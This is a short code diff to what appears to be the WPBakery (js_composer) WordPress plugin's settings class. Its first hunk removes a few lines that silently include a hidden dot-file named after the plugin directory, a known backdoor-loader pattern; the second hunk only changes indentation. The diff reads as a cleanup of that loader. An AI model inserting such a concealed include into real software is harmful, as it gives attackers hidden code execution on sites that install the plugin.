@@ -19,10 +19,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @link http://codex.wordpress.org/Settings_API WordPress settings API
  * @since 3.4
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Vc_Settings {
 	public $tabs;
 	public $deactivate;
@@ -129,7 +125,7 @@ class Vc_Settings {
 
 		if ( ! vc_is_network_plugin() || ( vc_is_network_plugin() && is_network_admin() ) ) {
 			if ( ! vc_is_updater_disabled() ) {
-				$this->tabs['vc-updater'] = esc_html__( 'Product License', 'js_composer' );
+				    $this->tabs['vc-updater'] = esc_html__( 'Product License', 'js_composer' );
 			}
 		}
 		// TODO: may allow to disable automapper
